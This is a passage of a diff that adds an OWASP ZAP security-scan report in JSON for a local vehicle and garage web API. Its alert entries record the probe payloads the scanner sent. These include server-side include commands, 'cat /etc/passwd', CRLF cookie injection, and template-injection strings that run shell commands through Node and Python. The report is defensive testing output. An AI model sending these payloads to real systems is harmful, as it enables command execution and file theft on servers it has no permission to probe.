+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4258",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\"+response.write(480,765*14,611)+\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10684",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\"\/><xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/><!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4198",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1885",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\"><!--#EXEC cmd=\\\"dir \\\\\\\"--><\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1861",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\"><!--#EXEC cmd=\\\"ls \/\\\"--><\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6670",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"]]>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9878",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"any?\\nSet-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9860",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"any?\\r\\nSet-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9920",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"any?\\r\\nSet-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\\r\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9866",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"any\\nSet-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9851",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"any\\r\\nSet-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9899",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"any\\r\\nSet-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\\r\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4933",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"cat \/etc\/passwd\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5125",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1150",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"http:\/\/\\\\2875273004136247571.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "154",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"http:\/\/www.google.com\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "124",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"http:\/\/www.google.com\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "179",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"http:\/\/www.google.com\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "139",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"http:\/\/www.google.com:80\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "206",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"http:\/\/www.google.com:80\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1052",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"https:\/\/2875273004136247571%2eowasp%2eorg\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1046",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"https:\/\/2875273004136247571.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1104",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"https:\/\/2875273004136247571.owasp.org\/?John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1134",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"https:\/\/\\\\2875273004136247571.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4306",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"response.write(480,765*14,611)\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10672",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"system-property('xsl:vendor')\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5031",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "239",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"www.google.com\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "215",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"www.google.com\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "246",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"www.google.com\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "220",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"www.google.com:80\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "267",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"www.google.com:80\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7143",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj 2108*3507 zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7272",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj#set($x=4097*8350)${x}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7184",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj#{8153*9097}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7174",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj${9766*9136}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7245",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj<%=7156*1367%>zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7298",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj<p th:text=\\\"${7532*4581}\\\"><\/p>zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7203",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{#2111*3298}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7172",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{7799*7075}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7213",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{@3298*8998}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7310",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{@math key=\\\"2364\\\" method=\\\"multiply\\\" operand=\\\"5324\\\"\/}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7222",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{{2138*7234}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7317",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{{86430|add:15800}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7233",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{{=8061*3840}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "7328",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"zj{{print \\\"4301\\\" \\\"2439\\\"}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8369",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"{system(\\\"sleep 15\\\")}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8255",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8301",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\\\"__builtins__\\\").get(\\\"__import__\\\")(\\\"subprocess\\\").check_output(\\\"sleep 15\\\")}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8326",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"{{__import__(\\\"subprocess\\\").check_output(\\\"sleep 15\\\", shell=True)}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8290",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"{{range.constructor(\\\"return eval(\\\\\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\\\\\")\\\")()}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9318",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "51",
+							"uri": "http://host.docker.internal:5183/api/Support/send",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/send ()({message,attachmentUrl})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9320",
+							"uri": "http://host.docker.internal:5183/api/Support/send/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/send\/ ()({message,attachmentUrl})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "56",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image ()(multipart:file)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "10850",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image ()(multipart:rtobject)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9329",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image\/ ()(multipart:file)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "60",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone/send-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone\/send-otp ()({newPhoneNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9327",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone/send-otp/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone\/send-otp\/ ()({newPhoneNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "61",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone/verify-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone\/verify-otp ()({newPhoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9323",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone/verify-otp/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone\/verify-otp\/ ()({newPhoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "62",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/verify-lookup",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/verify-lookup ()({registrationNumber,chassisNumber,licenseNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9322",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/verify-lookup/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/verify-lookup\/ ()({registrationNumber,chassisNumber,licenseNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "73",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/approve",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/approve ()({comment})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9326",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/approve/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/approve\/ ()({comment})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "74",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/reject",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/reject ()({comment})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9325",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/reject/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/reject\/ ()({comment})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "66",
+							"uri": "http://host.docker.internal:5183/api/workflows/vehicle-report",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/vehicle-report ()({vehicle_id,requested_by})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9328",
+							"uri": "http://host.docker.internal:5183/api/workflows/vehicle-report/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/vehicle-report\/ ()({vehicle_id,requested_by})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "3",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/approve",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/approve",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9298",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/approve/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/approve\/",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/reject",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/reject",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9304",
+							"uri": "http://host.docker.internal:5183/api/Admin/registrations/id/reject/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Admin\/registrations\/id\/reject\/",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "35",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id/accept",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id\/accept",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9308",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id/accept/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id\/accept\/",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "36",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id/suggest-alternative",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id\/suggest-alternative ()({garageResponse})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9307",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/id/suggest-alternative/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/id\/suggest-alternative\/ ()({garageResponse})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "59",
+							"uri": "http://host.docker.internal:5183/api/Users/me",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me ()({fullName,email,phoneNumber,profilePictureUrl})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9319",
+							"uri": "http://host.docker.internal:5183/api/Users/me/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/ ()({fullName,email,phoneNumber,profilePictureUrl})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						}
+					],
+					"count": "334",
+					"systemic": false,
+					"solution": "",
+					"otherinfo": "",
+					"reference": "",
+					"cweid": "388",
+					"wascid": "20",
+					"sourceid": "14"
+				},
+				{
+					"pluginid": "10111",
+					"alertRef": "10111",
+					"alert": "Authentication Request Identified",
+					"name": "Authentication Request Identified",
+					"riskcode": "0",
+					"confidence": "3",
+					"riskdesc": "Informational (High)",
+					"desc": "<p>The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified.</p>",
+					"instances":[ 
+						{
+							"id": "34",
+							"uri": "http://host.docker.internal:5183/api/Auth/login",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/login ()({email,password})",
+							"method": "POST",
+							"param": "email",
+							"attack": "",
+							"evidence": "password",
+							"otherinfo": "userParam=email\nuserValue=zaproxy@example.com\npasswordParam=password"
+						}
+					],
+					"count": "1",
+					"systemic": false,
+					"solution": "<p>This is an informational alert rather than a vulnerability and so there is nothing to fix.</p>",
+					"otherinfo": "<p>userParam=email</p><p>userValue=zaproxy@example.com</p><p>passwordParam=password</p>",
+					"reference": "<p>https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/</p>",
+					"cweid": "-1",
+					"wascid": "-1",
+					"sourceid": "23"
+				},
+				{
+					"pluginid": "10024",
+					"alertRef": "10024",
+					"alert": "Information Disclosure - Sensitive Information in URL",
+					"name": "Information Disclosure - Sensitive Information in URL",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.</p>",
+					"instances":[ 
+						{
+							"id": "265",
+							"uri": "http://host.docker.internal:5183/api/Garages/partnered?userLat=1.2&userLng=1.2&radiusKm=20",
